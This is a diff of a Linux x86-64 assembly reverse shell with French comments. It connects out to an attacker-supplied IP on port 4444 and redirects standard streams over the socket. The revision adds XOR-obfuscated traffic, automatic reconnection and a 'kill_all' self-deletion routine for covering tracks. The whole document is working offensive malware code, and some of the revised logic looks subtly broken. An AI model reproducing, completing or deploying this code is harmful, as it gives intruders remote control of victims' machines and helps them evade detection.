@@ -1,265 +1,412 @@
 section .data
-    command db '/bin/bash', 0
-    ip_str db '127.0.0.1', 0 ; Put IP address here
-    port_str db '4444', 0
+    command      db '/bin/bash',0
+    port_str     db '4444',0
+    bash_i       db '-i',0
+    bash_args    dq command, bash_i, 0
     
-    err_ip_format db 'Error: Invalid IP format', 10, 0
-    err_wrong_port db 'Error: Port must be 4444', 10, 0
-    err_socket db 'Error: Socket creation failed', 10, 0
+    ; Messages et commandes spéciales
+    kill_cmd     db 'kill_all',0
+    rm_cmd       db '/bin/rm',0
+    rm_arg1      db '-f',0
+    self_path    db '/proc/self/exe',0
+    err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
+    err_ip_format db 'Error: Invalid IP format',10,0
+    err_socket   db 'Error: Socket creation failed',10,0
+    err_connect  db 'Error: Connection failed',10,0
+    timespec     dq 5, 0          ; 5 secondes entre les tentatives
+
+    ; Clé de chiffrement (XOR simple)
+    xor_key      db 0x2A, 0x3F, 0x15, 0x1D, 0x0B, 0x7C, 0x55, 0x39
+    key_len      equ $ - xor_key
+
+    ; Arguments pour rm
+    rm_args     dq rm_cmd, rm_arg1, 0
 
 section .bss
-    ip_bytes resd 1
-    port_bytes resw 1
-    envp resq 256
+    ip_bytes    resd 1  ; IP en format réseau
+    port_bytes  resw 1  ; Port en format réseau
+    buffer      resb 1024
+    self_exe    resb 256
 
 section .text
     global _start
 
-_start:
-    ; Get stack pointer
-    mov rbx, rsp
-    ; Jump after argc
-    add rbx, 8
-
-    call jmp_arg
-    call jmp_envp
-
-    call validate_and_parse_ip
-    test rax, rax
-    jz ip_format_error
-    
-    ; Validate port
-    call validate_port
-    test rax, rax
-    jz port_error
-    
-    jmp connect
-
-jmp_arg:
-    ; Jump through each argument passed until NULL is reached
-    mov rax, [rbx]
-    add rbx, 8
-    test rax, rax
-    jnz jmp_arg
-
-jmp_envp:
-    ; Jump and store all environnemental variables until NULL is reached
-    mov rax, [rbx]
-    test rax, rax
-    je done_envp
-    mov [envp + rcx*8], rax
-    inc rcx
-    add rbx, 8
-    jmp jmp_envp
-done_envp:
-    ; Pass NULL to mark end of array
-    mov  qword [envp + rcx*8], 0
+;----------------------------------------------------------
+; Validation et conversion de l'IP
+; Entrée : rdi = pointeur vers la chaîne IP
+; Sortie : rax = 1 (succès), 0 (erreur)
+;----------------------------------------------------------
 validate_and_parse_ip:
     push rbp
     mov rbp, rsp
     push rbx
-    push rcx
-    push rdx
-    push r9
+    push r12
     
-    lea rsi, [ip_str]      
-    lea rdi, [ip_bytes]    
-    xor rbx, rbx            
-    xor rax, rax            
-    xor rcx, rcx            
-    xor r9, r9             
-    
+    mov rsi, rdi
+    xor rbx, rbx
+    xor r12d, r12d
+    xor eax, eax
+
 parse_ip_loop:
-    movzx rdx, byte [rsi + rcx]  
-    test rdx, rdx                
-    jz validate_last_octet
+    movzx edx, byte [rsi]
+    test dl, dl
+    jz end_parse
     
-    cmp rdx, '.'                 
+    cmp dl, '.'
     je store_octet
     
-    cmp rdx, '0'
-    jb ip_invalid
-    cmp rdx, '9'
-    ja ip_invalid
+    cmp dl, '0'
+    jb invalid_ip
+    cmp dl, '9'
+    ja invalid_ip
     
-    sub rdx, '0'
-    imul rax, 10
-    add rax, rdx
+    sub dl, '0'
+    imul eax, 10
+    add eax, edx
+    cmp eax, 255
+    ja invalid_ip
     
-    cmp rax, 255
-    ja ip_invalid
-    
-    inc rcx
+    inc rsi
     jmp parse_ip_loop
 
 store_octet:
-    ; Store current octet in the correct position
-    cmp rbx, 3               ; Check if we have too many octets
-    jae ip_invalid
+    cmp bl, 3
+    jae invalid_ip
     
-    shl r9, 8
-    or r9, rax
-    
-    inc rbx
-    xor rax, rax             ; Reset for next octet
-    inc rcx
+    shl r12d, 8
+    or r12d, eax
+    inc bl
+    xor eax, eax
+    inc rsi
     jmp parse_ip_loop
 
-validate_last_octet:
-    ; Store the last octet
-    cmp rbx, 3               ; Must be exactly 4th octet
-    jne ip_invalid
+end_parse:
+    cmp bl, 3
+    jne invalid_ip
     
-    shl r9, 8
-    or r9, rax
-    
-    mov eax, r9d
-    bswap eax
-    mov dword [ip_bytes], eax
-    
-    mov rax, 1               ; Success
-    jmp ip_parse_done
+    shl r12d, 8
+    or r12d, eax
+    bswap r12d
+    mov [ip_bytes], r12d
+    mov rax, 1
+    jmp done_ip
 
-ip_invalid:
+invalid_ip:
     xor rax, rax
 
-ip_parse_done:
-    pop r9
-    pop rdx
-    pop rcx
+done_ip:
+    pop r12
     pop rbx
     pop rbp
     ret
 
+;----------------------------------------------------------
+; Validation et conversion du port (fixé à 4444)
+;----------------------------------------------------------
 validate_port:
-    push rbp
-    mov rbp, rsp
-    push rsi
-    
-    lea rsi, [port_str]
-    
-    ; Check "4444"
-    cmp byte [rsi], '4'
-    jne port_invalid
-    cmp byte [rsi+1], '4'
-    jne port_invalid
-    cmp byte [rsi+2], '4'
-    jne port_invalid
-    cmp byte [rsi+3], '4'
-    jne port_invalid
-    cmp byte [rsi+4], 0
-    jne port_invalid
-    
-    ; Store port in network byte order (4444 = 0x115c)
-    mov word [port_bytes], 0x5c11
-    mov rax, 1
-    jmp port_valid_done
-
-port_invalid:
+    mov rsi, port_str
     xor rax, rax
+    xor rcx, rcx
 
-port_valid_done:
-    pop rsi
-    pop rbp
+convert_loop:
+    movzx edx, byte [rsi]
+    test dl, dl
+    jz check_value
+    
+    cmp dl, '0'
+    jb invalid_port
+    cmp dl, '9'
+    ja invalid_port
+    
+    sub dl, '0'
+    imul rax, 10
+    add rax, rdx
+    cmp rax, 65535
+    ja invalid_port
+    
+    inc rsi
+    inc rcx
+    jmp convert_loop
+
+check_value:
+    test rcx, rcx
+    jz invalid_port
+    
+    xchg al, ah
+    mov [port_bytes], ax
+    mov rax, 1
     ret
 
-connect:
-    ; socket(AF_INET, SOCK_STREAM, 0)
+invalid_port:
+    xor rax, rax
+    ret
+
+;----------------------------------------------------------
+; Chiffrement/déchiffrement XOR
+; Entrée : rdi = données, rsi = longueur
+;----------------------------------------------------------
+xor_crypt:
+    push rdi
+    push rsi
+    push rcx
+    push rdx
+    push r8
+    push r9
+
+    mov r8, rdi        ; buffer
+    mov r9, rsi        ; length
+    xor rcx, rcx       ; index
+    xor rdx, rdx       ; key index
+
+crypt_loop:
+    cmp rcx, r9
+    jge crypt_done
+    
+    ; Charger l'octet à chiffrer
+    mov al, [r8 + rcx]
+    
+    ; Charger l'octet de clé
+    mov bl, [xor_key + rdx]
+    
+    ; XOR
+    xor al, bl
+    
+    ; Stocker le résultat
+    mov [r8 + rcx], al
+    
+    ; Incrémenter les index
+    inc rcx
+    inc rdx
+    cmp rdx, key_len
+    jb next_crypt
+    xor rdx, rdx       ; Réinitialiser l'index de clé
+
+next_crypt:
+    jmp crypt_loop
+
+crypt_done:
+    pop r9
+    pop r8
+    pop rdx
+    pop rcx
+    pop rsi
+    pop rdi
+    ret
+
+;----------------------------------------------------------
+; Auto-destruction
+;----------------------------------------------------------
+self_destruct:
+    ; Lire le chemin de l'exécutable
+    mov rax, 89        ; sys_readlink
+    lea rdi, [self_path]
+    lea rsi, [self_exe]
+    mov rdx, 256
+    syscall
+    
+    test rax, rax
+    js exit_program
+    
+    ; Ajouter le NULL terminal
+    lea rdi, [self_exe]
+    add rdi, rax
+    mov byte [rdi], 0
+    
+    ; Ajouter le chemin à supprimer aux arguments
+    lea rsi, [rm_args + 16]  ; Position après les 2 premiers arguments
+    mov [rsi], rdi
+    
+    ; Supprimer l'exécutable
+    mov rax, 59        ; sys_execve
+    lea rdi, [rm_cmd]
+    lea rsi, [rm_args]
+    xor rdx, rdx
+    syscall
+
+;----------------------------------------------------------
+; Comparaison de chaînes
+; Entrée : rdi = str1, rsi = str2
+; Sortie : rax = 0 si égales
+;----------------------------------------------------------
+strcmp:
+    xor rcx, rcx
+
+compare_loop:
+    mov al, [rdi + rcx]
+    mov bl, [rsi + rcx]
+    cmp al, bl
+    jne not_equal
+    test al, al
+    jz equal
+    inc rcx
+    jmp compare_loop
+
+equal:
+    xor rax, rax
+    ret
+
+not_equal:
+    mov rax, 1
+    ret
+
+;----------------------------------------------------------
+; Programme principal
+;----------------------------------------------------------
+_start:
+    ; Récupération des arguments
+    pop rcx
+    pop rsi
+    
+    ; Vérifier nombre d'arguments
+    cmp rcx, 2
+    jne usage_error
+    
+    ; Récupérer l'adresse IP
+    pop rdi
+    call validate_and_parse_ip
+    test rax, rax
+    jz ip_error
+    
+    ; Valider le port
+    call validate_port
+    test rax, rax
+    jz port_error
+
+connection_loop:
+    ; Création du socket
     mov rax, 41
-    mov rdi, 2          ; AF_INET
-    mov rsi, 1          ; SOCK_STREAM
-    mov rdx, 0
-    syscall 
+    mov rdi, 2
+    mov rsi, 1
+    xor rdx, rdx
+    syscall
     
     test rax, rax
     js socket_error
-    mov r8, rax         ; Save socket fd
-    
-    ; Prepare sockaddr structure on stack
-    sub rsp, 16         ; Allocate space for sockaddr_in
-    mov word [rsp], 2   ; AF_INET
+    mov r8, rax         ; Sauvegarder le socket
+
+    ; Préparation de la structure d'adresse
+    sub rsp, 16
+    mov word [rsp], 2
     mov ax, [port_bytes]
-    mov word [rsp+2], ax ; Port
+    mov word [rsp+2], ax
     mov eax, [ip_bytes]
-    mov dword [rsp+4], eax ; IP
-    mov qword [rsp+8], 0   ; Zero padding
-    
-    ; connect(socket, sockaddr, 16)
-    mov rdi, r8         ; Socket fd
-    mov rsi, rsp        ; sockaddr structure
-    mov rdx, 16         ; Address length
-    mov rax, 42         ; sys_connect
+    mov dword [rsp+4], eax
+    mov qword [rsp+8], 0
+
+    ; Connexion
+    mov rax, 42
+    mov rdi, r8
+    mov rsi, rsp
+    mov rdx, 16
     syscall
     
-    add rsp, 16         ; Clean up stack
-    
+    add rsp, 16
     test rax, rax
-    js wait_and_retry
-    
+    js connect_error
+
+    ; Redirection des flux standard
     xor rsi, rsi
-    jmp dup2_loop
-
-wait_and_retry:
-timespec:
-    dq 10
-    dq 0
-
-    ; nanosleep(10, 0)
-    mov rax, 35
-    lea rdi, [rel timespec]
-    xor rsi, rsi
+dup_loop:
+    mov rax, 33
+    mov rdi, r8
     syscall
-    jmp connect
-
-dup2_loop:
-    ; dup2(client_fd, new_fd)
-    mov rax, 33         ; sys_dup2
-    mov rdi, r8         ; Source fd (socket)
-    ; rsi contains target fd (0, 1, 2)
-    syscall
-    
-    test rax, rax
-    js exit_with_error
-    
     inc rsi
     cmp rsi, 3
-    jne dup2_loop
-    
-    ; execve("/bin/bash", NULL, NULL)
-    mov rax, 59         ; sys_execve
-    lea rdi, [command]
-    xor rsi, rsi        ; argv = NULL  
-    mov rdx, envp        ; envp = NULL
-    syscall
-    
-    ; Should not reach here
-    jmp exit_with_error
+    jne dup_loop
 
-ip_format_error:
-    mov rax, 1          ; sys_write
-    mov rdi, 2          ; stderr
-    lea rsi, [err_ip_format]
-    mov rdx, 26
+    ; Boucle de surveillance des commandes
+surveillance_loop:
+    ; Lire les données du socket
+    mov rax, 0          ; sys_read
+    mov rdi, r8
+    lea rsi, [buffer]
+    mov rdx, 1024
     syscall
-    jmp exit_with_error
+
+    test rax, rax
+    jz exit_program     ; Connexion fermée
+    js exit_program     ; Erreur
+
+    ; Déchiffrer les données
+    mov rdi, rsi        ; buffer
+    mov rsi, rax        ; longueur
+    call xor_crypt
+
+    ; Vérifier la commande kill_all
+    lea rdi, [buffer]
+    lea rsi, [kill_cmd]
+    call strcmp
+    test rax, rax
+    jz destruct
+
+    ; Réchiffrer et renvoyer les données
+    mov rdi, buffer
+    mov rsi, rax
+    call xor_crypt
+
+    ; Écrire les données déchiffrées
+    mov rdx, rax        ; longueur
+    mov rax, 1          ; sys_write
+    mov rdi, r8
+    lea rsi, [buffer]
+    syscall
+
+    ; Continuer
+    jmp surveillance_loop
+
+destruct:
+    call self_destruct
+
+    ; Fermer la connexion
+    mov rax, 3          ; sys_close
+    mov rdi, r8
+    syscall
+    jmp exit_program
+
+usage_error:
+    mov rax, 1
+    mov rdi, 2
+    lea rsi, [err_usage]
+    mov rdx, 30
+    syscall
+    mov rdi, 1
+    jmp exit_program
+
+ip_error:
+    mov rax, 1
+    mov rdi, 2
+    lea rsi, [err_ip_format]
+    mov rdx, 25
+    syscall
+    mov rdi, 1
+    jmp exit_program
 
 port_error:
-    mov rax, 1          ; sys_write
-    mov rdi, 2          ; stderr
-    lea rsi, [err_wrong_port]
-    mov rdx, 23
-    syscall
-    jmp exit_with_error
+    mov rdi, 1
+    jmp exit_program
 
 socket_error:
-    mov rax, 1          ; sys_write
-    mov rdi, 2          ; stderr
+    mov rax, 1
+    mov rdi, 2
     lea rsi, [err_socket]
     mov rdx, 28
     syscall
-    jmp exit_with_error
+    mov rdi, 1
+    jmp exit_program
 
-exit_with_error:
-    mov rax, 60         ; sys_exit
-    mov rdi, 1          ; Exit code 1
+connect_error:
+    mov rax, 3          ; sys_close
+    mov rdi, r8
+    syscall
+    
+    ; Attendre avant de réessayer
+    mov rax, 35
+    lea rdi, [timespec]
+    xor rsi, rsi
+    syscall
+    
+    jmp connection_loop
+
+exit_program:
+    mov rax, 60
     syscall
